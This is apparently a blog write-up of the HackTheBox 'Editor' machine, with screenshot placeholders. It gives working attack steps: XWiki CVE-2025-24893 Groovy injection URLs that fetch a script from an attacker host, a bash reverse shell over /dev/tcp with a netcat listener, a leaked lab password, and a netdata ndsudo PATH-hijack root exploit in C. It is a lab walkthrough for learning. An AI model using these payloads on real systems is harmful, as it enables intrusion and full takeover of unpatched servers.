---
title: "Editor HackTheBox Writeup"
date: 2025-08-31
tags: [ssh, HackTheBox, ndsudo]
categories: [HackTheBox]
---

# HackTheBox - Editor

> **üì∏ Note**: This writeup contains image placeholders. To see the actual screenshots, add your real HackTheBox images to `static/images/hackthebox/Editor/` and update the image paths below.

üñºÔ∏è **CTF Challenge Banner** - *Add your screenshot here*

# Reccon

As usual we will start with the *Nmap*

```
nmap -sC -sV --min-rate 5000 -T5 -Pn -p- 10.10.11.80
```

üñºÔ∏è **Nmap Scan Results** - *Add your screenshot here*

Looking at the result , we have 

-   22/tcp   open  ssh     OpenSSH
-  80/tcp   open  http    nginx
-  8080/tcp open  http    Jetty

Let add *editor.htb* in our hosts file
```
echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

# WebEnumeration

On port 80 we have

üñºÔ∏è **Port 80 Web Enumeration** - *Add your screenshot here*

And on port *8080*

üñºÔ∏è **Port 8080 Web Enumeration** - *Add your screenshot here*

I saw the *Xwiki* version in the bottom , when i googled about it , i came acrros this CVE 2025-24893 

üñºÔ∏è **CVE Information** - *Add your screenshot here*

and for the exploit , i got this [Exploit](https://github.com/a1baradi/Exploit/blob/main/CVE-2025-24893.py) 
To get the shell , we first need to create *shell.sh*

```
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1
```

After creating a *shell.sh* start a python server in you local machine

```
python3 -m http.server 8000
```

Then in the browser Paste this encoded URL

 ```
  http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln("wget%20-qO%20/tmp/shell.sh%20http://10.10.14.205:8000/shell.sh".execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D

 ```

Then have a listener of your choice , mine is *net-cat*

```
rlwrap nc -lvnp 9001
```

Then execute your payload
```
http://editor.htb:8080/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22bash%20/tmp/shell.sh%22.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
```

And **Boom** u got your shell

üñºÔ∏è **Shell Access** - *Add your screenshot here*

In **/etc/passwd** u will find that there is a user called **oliver**

```
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
```

Then in the **WEB-INF** u will find **hibernate.cfg.xml**
In which u will find the password of **Oliver**

```
theEd1t0rTeam99
```

üñºÔ∏è **Hibernate Configuration** - *Add your screenshot here*
```
ssh oliver@editor.htb
```

Getting into the user , we got our **user.txt**

# Getting the Root

On Localhost at port 19999 there is a service running called **netdata**

üñºÔ∏è **Netdata Service** - *Add your screenshot here*

So we did some Port forwarding

```
ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

Paste this in your browser

```
http://localhost:19999/
```

üñºÔ∏è **Port Forwarding** - *Add your screenshot here*

Clicking on the **Please update them** , we get the version **1.45.2**

üñºÔ∏è **Version Information** - *Add your screenshot here*

After digging the internet we get this [CVE-2024-32019](CVE-2024-32019) **Oliver** has permission to run `ndsudo`:

1. Place an executable with a name that is on `ndsudo`'s list of commands (e.g. `nvme`) in a writable path
2. Set the `PATH` environment variable so that it contains this path
3. Run `ndsudo` with a command that will run the aforementioned executable First we need to make an **exploit.c** binary , then compile it

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);       // Switch to root
    setgid(0);       // Switch group to root
    system("/bin/bash");  // Spawn a root shell
    return 0;
}
```

Then compile it

```
gcc -o nvme exploit.c
```

Then we need to upload the exploit.c in Oliver's **/tmp** directory , for that we will use python server

```
python3 -m http.server 8000
```

Then the following

```
curl http://<YOUR-IP>:8000/nvme -o nvme
chmod +x nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

And **Boom** we got the root.txt

üñºÔ∏è **Root Flag** - *Add your screenshot here*

---

## üì∏ **Image Setup Instructions:**

To add your actual HackTheBox screenshots:

1. **Create the directory**: `mkdir -p static/images/hackthebox/Editor/`
2. **Add your images** with descriptive names like:
   - `nmap-results.png`
   - `port80-enum.png`
   - `shell-access.png`
   - `root-flag.png`
3. **Update the image paths** in this post to use:
   ```markdown
   ![Description](/images/hackthebox/Editor/filename.png)
   ```
4. **Recommended image size**: 800x600 pixels for screenshots
